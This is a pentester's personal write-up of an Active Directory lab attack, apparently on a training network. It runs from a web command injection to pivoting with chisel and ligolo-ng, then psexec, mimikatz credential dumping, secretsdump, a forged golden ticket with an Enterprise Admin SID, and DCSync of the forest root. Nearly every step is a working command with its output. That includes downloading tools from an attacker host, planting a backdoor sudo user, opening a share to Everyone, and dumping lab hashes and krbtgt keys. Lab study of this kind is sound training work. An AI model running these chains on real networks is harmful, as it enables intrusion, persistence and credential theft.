
###### TODO
https://academy.hackthebox.com/module/details/136
https://academy.hackthebox.com/module/19/section/101
https://academy.hackthebox.com/module/details/158
network sec: https://chat.deepseek.com/a/chat/s/af110a33-0db5-4dfb-91ee-27973257b3a0
- https://www.hackingarticles.in/domain-persistence-dsrm/
- https://adsecurity.org/?p=1785


-----
#### http://192.168.80.10
##### command injection
1. sign up
2. inject `id` on contuctUS email 
3. note `config.php`
	```
		$host = "localhost";  
        $user = "root";  
        $password = 'Web!@#$%';  
        $db_name = "pro";  

	```
4. use it create `runit.php` to query DB remotly 
	![[Pasted image 20250501090821.png]]
	1. leaked username/pass on `/etc/passwd`
	```
	ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bash
	systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
	privilege:x:1001:1001:Admin@962:/home/privilege:/bin/bash
	```
##### SSH 
```
privilege@ubuntu-virtual-machine:~$ sudo -l 
Matching Defaults entries for privilege on ubuntu-virtual-machine:
....
User privilege may run the following commands on ubuntu-virtual-machine:
    (ALL : ALL) ALL
privilege@ubuntu-virtual-machine:~$ sudo useradd username
privilege@ubuntu-virtual-machine:~$ sudo passwd username
privilege@ubuntu-virtual-machine:~$ sudo usermod -aG sudo username
privilege@ubuntu-virtual-machine:~$ sudo echo "AllowUsers username" >> /etc/ssh/sshd_config
```
##### local sys enum
```
privilege@ubuntu-virtual-machine:~/.mozilla/firefox/b2rri1qd.default-release$ sqlite3 places.sqlite 
	18|1|16|5|0|http://192.168.98.30/admin/index.php?user=john@child.warfare.corp&pass=User1@#$%6|||1737028407427000|1737029666390000|tuXr2pTr03P2|1|7
```
```
privilege@ubuntu-virtual-machine:~/.mozilla/firefox/b2rri1qd.default-release$ ip a
1: lo......
2: ens34: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 1000
    link/ether 00:0c:29:28:1b:7e brd ff:ff:ff:ff:ff:ff
    altname enp2s2
    inet 192.168.98.15/24 brd 192.168.98.255 scope global noprefixroute ens34
       valid_lft forever preferred_lft forever
3: ens32: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:96:17:f9 brd ff:ff:ff:ff:ff:ff
    altname enp2s0
    inet 192.168.80.10/24 brd 192.168.80.255 scope global noprefixroute ens32
       valid_lft forever preferred_lft forever
```
##### port forwarding `chisel`
```
└─$ ./chisel server -p 8888 --reverse

root@ubuntu-virtual-machine:~# wget http://10.10.200.248:8085/chisel
root@ubuntu-virtual-machine:~# ./chisel client 10.10.200.248:8888 R:8800:socks
```
#### internal network
```
#!/bin/bash

# Intervalo de IPs da rede (ex: 192.168.0.1-254)
REDE="192.168.98"
PORTAS=(21 22 23 25 53 80 110 139 143 443 445 3389)

echo "[*] Iniciando varredura na rede $REDE.0/24..."

# Função para verificar se o host está ativo
check_host() {
  ping -c 1 -W 1 $1 &>/dev/null && echo $1 >> hosts_ativos.txt
}

# Função para verificar portas abertas em um host
scan_portas() {
  echo "[+] Verificando portas em $1"
  for PORTA in "${PORTAS[@]}"; do
    timeout 1 bash -c "echo > /dev/tcp/$1/$PORTA" 2>/dev/null &&
      echo "    Porta $PORTA aberta" || true
  done
}

# Limpa arquivos anteriores
> hosts_ativos.txt

# Descobre hosts ativos
for i in {1..254}; do
  IP="$REDE.$i"
  check_host $IP &
done
wait

echo "[*] Hosts ativos encontrados:"
cat hosts_ativos.txt

# Scan de portas em cada host ativo
for HOST in $(cat hosts_ativos.txt); do
  scan_portas $HOST
done

privilege@ubuntu-virtual-machine:~$ bash scan.sh 
[*] Iniciando varredura na rede 192.168.98.0/24...
[*] Hosts ativos encontrados:
192.168.98.2
192.168.98.15
192.168.98.30
192.168.98.120
[+] Verificando portas em 192.168.98.2
    Porta 53 aberta
    Porta 139 aberta
    Porta 445 aberta
[+] Verificando portas em 192.168.98.15
    Porta 22 aberta
    Porta 80 aberta
[+] Verificando portas em 192.168.98.30
    Porta 139 aberta
    Porta 445 aberta
[+] Verificando portas em 192.168.98.120
    Porta 53 aberta
    Porta 139 aberta
    Porta 445 aberta
```
#### 89.15
```
└─$ #!/bin/bash
target="192.168.98.15"
for port in {1..1024}; do
    proxychains4 nc -zv -w 2 $target $port 2>&1 | grep -E "succeeded|open"
done

192.168.98.15 [192.168.98.15] 22 (ssh) open : Operation now in progress
192.168.98.15 [192.168.98.15] 80 (http) open : Operation now in progress

```
#### 89.30
```
──(kali㉿kali)-[~/AD/cwl/192.168.80.10]
└─$ proxychains4 impacket-psexec  -dc-ip 192.168.98.30 child.warfare.corp/john:'User1@#$%6'@192.168.98.30
[proxychains] config file found: /etc/proxychains4.conf
..........
[proxychains] Dynamic chain  ...  127.0.0.1:8800  ...  192.168.98.30:445  ...  OK
[*] Requesting shares on 192.168.98.30.....
[*] Found writable share ADMIN$
[*] Uploading file iXdVLHRJ.exe
[*] Opening SVCManager on 192.168.98.30.....
[*] Creating service srzk on 192.168.98.30.....
[*] Starting service srzk.....
[proxychains] Dynamic chain  ...  127.0.0.1:8800  ...  192.168.98.30:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:8800  ...  192.168.98.30:445  ...  OK
[!] Press help for extra shell commands
[proxychains] Dynamic chain  ...  127.0.0.1:8800  ...  192.168.98.30:445  ...  OK
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> powershell -ep bypass
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.
cd C:\
mkdir tPS C:\Windows\system32> cd C:\temp
$client = new-object System.Net.WebClient
$client.DownloadFile("http://192.168.98.15:8085/mimikatz.exe","C:\\temp\\mimikatz.exe")
PS C:\temp> $client = new-object System.Net.WebClient
PS C:\temp> $client.DownloadFile("http://192.168.98.15:8085/mimikatz.exe","C:\\temp\\mimikatz.exe")
.\mimikatz.exe
 
PS C:\temp> .\mimikatz.exe 
mimikatz # 
privilege::debug
token::elevate 
         [00000003] Primary
         * Username : MGMT$
         * Domain   : CHILD
         * NTLM     : 0f5fe480dd7eaf1d59a401a4f268b563
         * SHA1     : d32c7612b20a8dcf4814b5caf34882574bdde577
User Name         : john
Domain            : CHILD
Logon Server      : CDC
SID               : S-1-5-21-3754860944-83624914-1883974761-1104
        msv :
         [00000003] Primary
         * Username : john
         * Domain   : CHILD
		 * NTLM     : b6f7e9a9a92eaa9ecffb698657dfab36
         * SHA1     : 86f3d2ad0b92212e2fb2b83428d10b142b26b8f3
         * DPAPI    : d914104baf68e427d43388da88ba07de
Authentication Id : 0 ; 27255442 (00000000:019fe292)
Session           : Service from 0
User Name         : corpmngr
Domain            : CHILD
Logon Server      : CDC
Logon Time        : 1/19/2025 8:51:56 PM
SID               : S-1-5-21-3754860944-83624914-1883974761-1106
        msv :
         [00000003] Primary
         * Username : corpmngr
         * Domain   : CHILD
	     * NTLM     : 4cb3933610b827a281ec479031128cc6
         * SHA1     : 787ca795ff1fad3d47195af7de18e029422d8d42
         * DPAPI    : d5524dd25f13d1b39eedc875de1a6e87
mimikatz # 
lsadump::sam
mimikatz # Domain : MGMT
SysKey : 7d25542d784b7dec178f7c6d07cd7aa0
Local SID : S-1-5-21-3850249844-1891678867-926332865
SAMKey : b4e68b662c2c2d564f194ad44751b050
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 69865e966bb089639e9b1c7f719427fa
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 67f9a4b9dde9adc0e1e0c145022786e0
* Primary:Kerberos-Newer-Keys *
    Default Salt : MGMTAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 03eeb7806bbbe9e937dade8731a7abc3fa1c6b1113954ff7d1cfc008b2959f93
      aes128_hmac       (4096) : c90bdeff0abdeeb4506eb7fe67f2a8f0
      des_cbc_md5       (4096) : 49ec8c9e6ea1ec79
    OldCredentials
      aes256_hmac       (4096) : 92f18a085b60f81b449b628141383a095f66fed4159caa52c17f2f9875a3af3b
      aes128_hmac       (4096) : 5b63d0504d6347dbfbe36673b4cd3687
      des_cbc_md5       (4096) : 020e8f92d598f85e
    OlderCredentials
      aes256_hmac       (4096) : 03eeb7806bbbe9e937dade8731a7abc3fa1c6b1113954ff7d1cfc008b2959f93
      aes128_hmac       (4096) : c90bdeff0abdeeb4506eb7fe67f2a8f0
      des_cbc_md5       (4096) : 49ec8c9e6ea1ec79
* Primary:Kerberos *
    Default Salt : MGMTAdministrator
    Credentials
      des_cbc_md5       : 49ec8c9e6ea1ec79
    OldCredentials
      des_cbc_md5       : 020e8f92d598f85e
RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 169a376cbed3e83e5ea8eec2d248ce0c

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 61625a575e00c7316e5fdfe899124072

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d1491c0ec1590aad6057b69c2159dc7d59da04effb7735249cc9df27dd94ad0f
      aes128_hmac       (4096) : c93ee6eee38b81d95015af055f5727a3
      des_cbc_md5       (4096) : 61299e7a768fa2d5

```
we can use `smbclient` to move files directory to attacked machine inside of upload to `.15` , then move to targeted machine
```
proxychains4 smbclient -U 'child/john'%'User1@#$%6' //192.168.98.30/C$
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:8800  ...  192.168.98.30:445  ...  OK
Try "help" to get a list of possible commands.
smb: \> cd temp
smb: \temp\> put SharpHound.exe 
putting file SharpHound.exe as \temp\SharpHound.exe (184.1 kb/s) (average 184.1 kb/s)
```
##### SharpHound.exe
```
SharpHound.exe
SharpHound.exe -d warfare.corp
```
we can download zip files via `smbclient`
##### DcSync
![[Pasted image 20250501182020.png]]

-----
#### 98.120
```
└─$ proxychains4 impacket-psexec 'child/corpmngr@192.168.98.120' -hashes :4cb3933610b827a281ec479031128cc6 
```
upload mimikatz : `proxychains4 impacket-smbclient  -dc-ip 192.168.98.120 child/corpmngr@192.168.98.120 -hashes b6f7e9a9a92eaa9ecffb698657dfab36:4cb3933610b827a281ec479031128cc6 `
![[Pasted image 20250501182621.png]]
```
mimikatz # privilege::debug 
mimikatz # token::elevate 
mimikatz # lsadump::lsa /patch
```
![[Pasted image 20250501183110.png]]
```
└─$ proxychains4 impacket-secretsdump 'child/corpmngr@192.168.98.120' -hashes :4cb3933610b827a281ec479031128cc6 
```
----
#### 98.2
##### SIDHistory
> A **Security Identifier (SID)** uniquely identifies each security principal (user, group, or computer) in a domain and controls access to resources. When users or groups are migrated between domains, their **SID history** retains the original SID to maintain access in the source domain. However, this feature can be **abused for persistence**: by adding a privileged account’s SID (e.g., Domain Admin) to a normal account’s SID history, the normal account can gain elevated rights without being directly granted them.

> History Can Be Whatever We Want It To Be, - We can take this attack a step further if we inject the Enterprise Admin SID since this would elevate the account's privileges to effective be Domain Admin in all domains in the forest.


> We could use something like Mimikatz to add SID history. However, the latest version of Mimikatz has a flaw that does not allow it to patch LSASS to update SID history. Hence we need to use something else. In this case, we will use the [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) tools to directly patch the ntds.dit file, the AD database where all information is stored:
 
```Terminal
PS C:\Users\Administrator.ZA>Stop-Service -Name ntds -force  PS C:\Users\Administrator.ZA> Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit  PS C:\Users\Administrator.ZA>Start-Service -Name ntds
```

- Domain trust
```
on 192.168.98.120 -> Get-ADTrust -Filter *
	Direction               : BiDirectional
    Name                    : warfare.corp
```
![[Pasted image 20250512142927.png]]
1. dump kerbtgt hash for chiled
2. SID for chiled, parent 
	`child: DomainSID: S-1-5-21-3754860944-83624914-1883974761`
	`parent: DomainSID: S-1-5-21-3375883379-808943238-3239386119`
	
`krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e57dd34c1871b7a23fb17a77dec9b900:::`
`krbtgt:aes256-cts-hmac-sha1-96:ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2`
- SID attack
```
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:child.warfare.corp /sid:S-1-5-21-3754860944-83624914-1883974761 /sids:S-1-5-21-3375883379-808943238-3239386119-519 /aes256:ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 /startoffset:-5 /endin:600 /renewmax:10080 /ptt" "exit"
```
- get shell using winrs
`winrs -r:DC01.warfare.corp cmd`
- can't move mimkatz to DC01
```
net share MyShare="C:\Users\corpmngr" /GRANT:Everyone,FULL
Icacls "C:\Users\corpmngr" /grant Everyone:F /inheritance:e /T
winrs -r:DC01.warfare.corp cmd
copy \\192.168.98.120\MyShare\mimikatz.exe C:\Users\Administrator.CHILD\
copy \\CDC.child.warfare.corp\MyShare\mimikatz.exe C:\Users\Administrator.CHILD\
copy \\CDC\MyShare\mimikatz.exe C:\Users\Administrator.CHILD\
```
- dcsync
```
mimikatz # lsadump::dcsync /user:Administrator@warfare.corp /domain:warfare.corp
mimikatz # [DC] 'warfare.corp' will be the domain
[DC] 'dc01.warfare.corp' will be the DC server
[DC] 'Administrator@warfare.corp' will be the user account
Object RDN           : Administrator
** SAM ACCOUNT **
SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Account expiration   : 1/1/1601 5:30:00 AM
Password last change : 1/17/2025 4:10:27 PM
Object Security ID   : S-1-5-21-3375883379-808943238-3239386119-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: a2f7b77b62cd97161e18be2ffcfdfd60
```
- psexec
![[Pasted image 20250512163028.png]]
> proxychain didn't used , due to `ligolo-ng` creates interface, so u can connect to internal network directly
---
#### pivot using `ligolo-ng`
https://github.com/nicocha30/ligolo-ng
https://docs.ligolo.ng/
https://www.youtube.com/watch?v=DM1B8S80EvQ
1. download `proxy`, `client` from github: 
2. move agent to target :
	1. `python -m http.server 8085`
	2. `wget http://10.10.200.248:8085/ligolo-ng_agent_0.8.1_linux_amd64.tar`
	3. `tar x -f ligolo-ng_agent_0.8.1_linux_amd64.tar`
3. run proxy `sudo ./proxy -selfcert `
	1. generate `fingerprint`
	```
	igolo-ng » certificate_fingerprint
	INFO[0006] TLS Certificate fingerprint for ligolo is: F2912B7F97285B69CE0E98787AD067D7995A90130B45541A4036C9F68610078F 
	```
4. connect client to proxy
	`./agent  -connect 10.10.200.248:11601 -accept-fingerprint F2912B7F97285B69CE0E98787AD067D7995A90130B45541A4036C9F68610078F`
5. start tunneling
	![[Pasted image 20250512164328.png]]
6. if u get error from route then delete route and re-add it
	```
	└─$ ip route show | grep 192.168.98.0/24
	192.168.98.0/24 via 10.10.200.1 dev tun0 
	┌──(kali㉿kali)-[/tmp]
	└─$ sudo ip route del 192.168.98.0/24
	┌──(kali㉿kali)-[/tmp]
	└─$ sudo ip route add 192.168.98.0/24 dev ligolo
	```


